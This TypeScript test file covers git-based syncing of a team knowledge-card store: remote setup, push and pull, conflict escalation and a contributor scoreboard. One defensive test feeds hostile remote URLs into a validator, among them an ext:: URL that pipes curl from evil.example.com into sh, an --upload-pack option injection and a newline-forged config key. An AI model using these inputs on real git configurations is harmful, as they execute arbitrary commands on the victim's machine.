import test, { after } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { existsSync, mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { appendReceipt } from "./receipts.js";
import { approveCard, getCard, listCards, openStore, proposeCard, type CardStore } from "./store.js";
import { crossPollination, pullCards, pushCards, remoteStatus, setRemote } from "./team.js";
import type { Card, CardProposal, Provenance } from "./types.js";

// Sync is the one part of this product that cannot be mocked into meaning anything: the claim is
// "your team's memory is a git remote", so these tests use REAL repos — two independently created
// stores and a real bare repo standing in for the git host the team already trusts. A faked git
// would happily pass while the two claims that matter rot: that a card written on one machine
// arrives intact on another, and that two people disagreeing is escalated rather than silently
// resolved in somebody's favour.

const scratchDirs: string[] = [];
after(() => {
  for (const dir of scratchDirs) rmSync(dir, { recursive: true, force: true });
});

function scratchDir(prefix: string): string {
  const dir = mkdtempSync(join(tmpdir(), prefix));
  scratchDirs.push(dir);
  return dir;
}

/** Identity is passed inline everywhere — the machine's ~/.gitconfig is never assumed to exist. */
function git(dir: string, args: string[]): string {
  return execFileSync("git", ["-C", dir, "-c", "user.email=t@t.dev", "-c", "user.name=T", ...args], {
    encoding: "utf8",
  }).trim();
}

/** The shared remote: a bare repo in a temp dir, which is exactly what a git host is. */
function sharedRemote(): string {
  const dir = scratchDir("kage-remote-");
  execFileSync("git", ["init", "--bare", "-q", "-b", "main", dir]);
  return dir;
}

/**
 * A teammate: their own product checkout, their own store root. Two of these never share a byte
 * until a remote is configured — which is the solo case the product ships free.
 */
function teammate(): CardStore {
  return openStore(scratchDir("kage-project-"), scratchDir("kage-root-"));
}

const SESSION: Provenance = { source: "session", ref: "s-1", at: "2026-08-04T10:00:00.000Z" };

function proposal(overrides: Partial<CardProposal> = {}): CardProposal {
  return {
    kind: "caution",
    title: "tenantLimit comparison is exclusive on purpose",
    claim: "withinLimit uses < rather than <= so a tenant at exactly the limit is refused.",
    citations: [{ path: "src/limits.ts", symbol: "withinLimit" }],
    trigger: "editing src/limits.ts",
    ...overrides,
  };
}

function propose(store: CardStore, overrides: Partial<CardProposal> = {}): Card {
  const result = proposeCard(store, proposal(overrides), SESSION);
  if ("problems" in result) throw new Error(`refused: ${JSON.stringify(result.problems)}`);
  return result.card;
}

/** Propose and approve in one step — approval is where a card gets a human's name on it. */
function approved(store: CardStore, reviewer: string, overrides: Partial<CardProposal> = {}): Card {
  const card = propose(store, overrides);
  const result = approveCard(store, card.id, reviewer);
  if ("error" in result) throw new Error(result.error);
  return result.card;
}

function served(store: CardStore, cardId: string, at = "2026-08-04T11:00:00.000Z"): void {
  appendReceipt(store.dir, { type: "recall_served", at, cardId });
}

// ── Solo is a supported state, not a broken one ──────────────────────────────────────────────

test("a store with no remote reads as solo — configured false, and never an error", () => {
  const store = teammate();
  const status = remoteStatus(store);

  assert.equal(status.configured, false);
  assert.equal(status.url, null);
  assert.equal(status.error, undefined, "offline and un-shared is the majority case, not a failure");
  assert.equal(status.branch, "main");
  assert.equal(status.dirty, false);
});

test("the untracked receipts ledger does not make a store read as dirty", () => {
  // Receipts are one machine's counted events and are deliberately never committed. If they
  // counted as dirt, every store would be permanently dirty and the flag would mean nothing.
  const store = teammate();
  served(store, "card_00000000");
  assert.equal(remoteStatus(store).dirty, false);
});

test("push and pull on a solo store refuse in words, and do not throw", () => {
  const store = teammate();
  const push = pushCards(store);
  const pull = pullCards(store);

  assert.equal(push.ok, false);
  assert.match(push.error ?? "", /no remote/);
  assert.equal(pull.ok, false);
  assert.match(pull.error ?? "", /no remote/);
  assert.deepEqual(pull.conflicts, []);
});

// ── Configuring the remote ───────────────────────────────────────────────────────────────────

test("setting a remote makes the store configured, and every local commit reads as unshared", () => {
  const store = teammate();
  approved(store, "kushal");
  const remote = sharedRemote();

  assert.deepEqual(setRemote(store, remote), { ok: true });

  const status = remoteStatus(store);
  assert.equal(status.configured, true);
  assert.equal(status.url, remote);
  // init + propose + approve. A configured store that has never pushed must not read as "in
  // sync" — nothing here has left the machine.
  assert.equal(status.ahead, 3);
  assert.equal(status.behind, 0);
});

test("re-pointing an existing origin replaces it rather than failing", () => {
  const store = teammate();
  setRemote(store, sharedRemote());
  const moved = sharedRemote();

  assert.deepEqual(setRemote(store, moved), { ok: true });
  assert.equal(remoteStatus(store).url, moved);
});

test("a url git would execute rather than fetch is refused before it reaches git config", () => {
  const store = teammate();
  // Every one of these is a real git behaviour, not a hypothetical: ext:: runs a command, a
  // leading dash is parsed as an option that spawns a helper, and a newline forges config keys.
  const refused = [
    "ext::sh -c 'curl evil.example.com | sh'",
    "--upload-pack=/tmp/pwn.sh",
    "https://example.com/team.git\n[core]\n\tpager = sh",
    "file:///tmp/store",
    "team/app.git",
    "",
  ];

  for (const url of refused) {
    const result = setRemote(store, url);
    assert.equal(result.ok, false, `expected ${JSON.stringify(url)} to be refused`);
    assert.match(result.error ?? "", /not a shareable git remote|use https/);
  }
  assert.equal(remoteStatus(store).configured, false, "a refused url never reaches .git/config");
});

test("the four shapes teams actually paste are accepted", () => {
  for (const url of [
    "https://github.com/team/app-memory.git",
    "ssh://git@github.com/team/app-memory.git",
    "git@github.com:team/app-memory.git",
    "/Volumes/shared/app-memory.git",
  ]) {
    const store = teammate();
    assert.deepEqual(setRemote(store, url), { ok: true }, url);
    assert.equal(remoteStatus(store).url, url);
  }
});

// ── Sending ──────────────────────────────────────────────────────────────────────────────────

test("pushing shares every unshared commit, and pushing again shares nothing", () => {
  const store = teammate();
  approved(store, "kushal");
  setRemote(store, sharedRemote());

  const first = pushCards(store);
  assert.equal(first.ok, true);
  assert.equal(first.pushed, 3, "counted from the divergence git reported, not from push output");

  const after = remoteStatus(store);
  assert.equal(after.ahead, 0, "the upstream is set on the first push, so ahead/behind become real");
  assert.equal(after.behind, 0);

  // A push of nothing is a success with nothing counted — not an error, and not a network call.
  assert.deepEqual(pushCards(store), { ok: true, pushed: 0 });
});

// ── Receiving ────────────────────────────────────────────────────────────────────────────────

test("pulling from a remote nobody has pushed to yet is not a failure", () => {
  const store = teammate();
  setRemote(store, sharedRemote());

  const pull = pullCards(store);
  assert.equal(pull.ok, true);
  assert.equal(pull.merged, 0, "nothing arrived because nothing was sent — day one of a team");
  assert.deepEqual(pull.conflicts, []);
});

test("a card approved on one machine lands intact on the other's next pull", () => {
  const remote = sharedRemote();
  const kushal = teammate();
  const dana = teammate();
  setRemote(kushal, remote);
  setRemote(dana, remote);

  const card = approved(kushal, "kushal");
  assert.equal(pushCards(kushal).ok, true);

  const pull = pullCards(dana);
  assert.equal(pull.ok, true, pull.error);
  assert.deepEqual(pull.conflicts, []);
  assert.equal(pull.merged, 1, "one card file changed on disk, which is what 'merged' counts");

  // Intact means byte-identical knowledge, not an approximation of it.
  assert.deepEqual(getCard(dana, card.id), card);
  assert.equal(listCards(dana, { state: "approved" }).length, 1);

  // The two stores were created independently, so their roots are unrelated and their README
  // signposts collide. That is housekeeping, not knowledge: the local one is kept and the sync
  // goes through, because blocking a team's first sync on a README would be absurd.
  assert.match(readFileSync(join(dana.dir, "README.md"), "utf8"), new RegExp(dana.projectDir));
  assert.equal(remoteStatus(dana).dirty, false, "the merge was finished, not left half-done");

  // And it round-trips: dana's own card reaches kushal the same way.
  const danas = approved(dana, "dana", { title: "retries are capped at three", claim: "sendWithRetry stops after three attempts so a poisoned job cannot loop forever." });
  assert.equal(pushCards(dana).ok, true);
  assert.equal(pullCards(kushal).ok, true);
  assert.deepEqual(getCard(kushal, danas.id), danas);
});

test("two people asserting different things about the same card is returned as a question, not merged away", () => {
  const remote = sharedRemote();
  const kushal = teammate();
  const dana = teammate();
  setRemote(kushal, remote);
  setRemote(dana, remote);

  // Same claim on both machines means the same content-addressed id — and then two different
  // humans approve it, so the same file says two different things about who vouched for it.
  const card = approved(kushal, "kushal");
  const same = approved(dana, "dana");
  assert.equal(same.id, card.id, "ids are content-addressed, so this really is one card");

  assert.equal(pushCards(kushal).ok, true);
  const pull = pullCards(dana);

  assert.equal(pull.ok, false);
  assert.deepEqual(pull.conflicts, [card.id], "the card id, so a human can open the thing in dispute");
  assert.equal(pull.merged, 0);
  assert.match(pull.error ?? "", /resolve/);

  // Left resolvable on purpose: the merge is still in progress with both versions in the tree,
  // git status explains itself, and the store reads dirty until a human finishes the job.
  assert.ok(existsSync(join(dana.dir, ".git", "MERGE_HEAD")), "the merge was not aborted away");
  assert.match(readFileSync(join(dana.dir, "cards", `${card.id}.md`), "utf8"), /<<<<<<</);
  assert.equal(remoteStatus(dana).dirty, true);

  // Nothing was picked for them: dana's own approval is still the one on record until they say
  // otherwise, and the conflicted file is still listed as unmerged.
  assert.match(git(dana.dir, ["diff", "--name-only", "--diff-filter=U"]), new RegExp(card.id));
});

// ── The team scoreboard ──────────────────────────────────────────────────────────────────────

test("cross-pollination counts other people's cards delivered into my agent, and only those", () => {
  const store = teammate();
  const mine = approved(store, "kushal");
  const hers = approved(store, "dana", { title: "retries are capped at three", claim: "sendWithRetry stops after three attempts so a poisoned job cannot loop forever." });
  const his = approved(store, "sam", { title: "the queue is drained oldest first", claim: "drainQueue pops from the head so a burst cannot starve the jobs behind it." });

  served(store, mine.id);
  served(store, mine.id);
  served(store, hers.id);
  served(store, hers.id);
  served(store, hers.id);
  served(store, his.id);

  const board = crossPollination(store, "kushal");
  assert.equal(board.total, 4, "my own card being recalled is memory working, not cross-pollination");
  assert.deepEqual(board.byAuthor, [
    { author: "dana", delivered: 3 },
    { author: "sam", delivered: 1 },
  ]);

  // Repeats count. A card that answered three questions helped three times, and collapsing that
  // to "one card" would undersell the only thing here worth measuring.
  assert.equal(board.byAuthor[0].delivered, 3);
});

test("the same teammate under two spellings is one person on the board", () => {
  const store = teammate();
  const older = approved(store, "dana", { title: "the queue is drained oldest first", claim: "drainQueue pops from the head so a burst cannot starve the jobs behind it." });
  const newer = approved(store, "Dana");
  served(store, older.id);
  served(store, newer.id); // appended last, so this is the most recent delivery

  const board = crossPollination(store, "kushal");
  assert.equal(board.byAuthor.length, 1, "case is folded — one teammate, not two");
  assert.equal(board.byAuthor[0].delivered, 2);
  assert.equal(board.byAuthor[0].author, "Dana", "the most recent spelling is shown — a board that renames people is not trusted");
});

test("a delivery that names no human is not credited to an invented one", () => {
  const store = teammate();
  // Proposed by a session, never approved: real knowledge, but nobody has put their name on it.
  const unowned = propose(store);
  served(store, unowned.id);
  // And a receipt for a card that is not in the store at all.
  served(store, "card_deadbeef");

  assert.deepEqual(crossPollination(store, "kushal"), { total: 0, byAuthor: [] });
});

test("with no identity given, nothing is claimed as cross-pollination", () => {
  const store = teammate();
  const card = approved(store, "dana");
  served(store, card.id);

  // Without knowing who I am, every attributed delivery would count as somebody else's — which
  // flatters the number by exactly the amount I contributed. Zero is the honest answer.
  assert.deepEqual(crossPollination(store, "  "), { total: 0, byAuthor: [] });
});

test("a card whose author only exists in provenance is still credited to that human", () => {
  const store = teammate();
  const result = proposeCard(store, proposal(), { source: "human", ref: "dana", at: SESSION.at });
  if ("problems" in result) throw new Error("refused");
  served(store, result.card.id);

  // reviewedBy is preferred because approval is where team knowledge is born, but a card a human
  // wrote by hand names its author in provenance and that name is just as real.
  assert.deepEqual(crossPollination(store, "kushal"), {
    total: 1,
    byAuthor: [{ author: "dana", delivered: 1 }],
  });
});
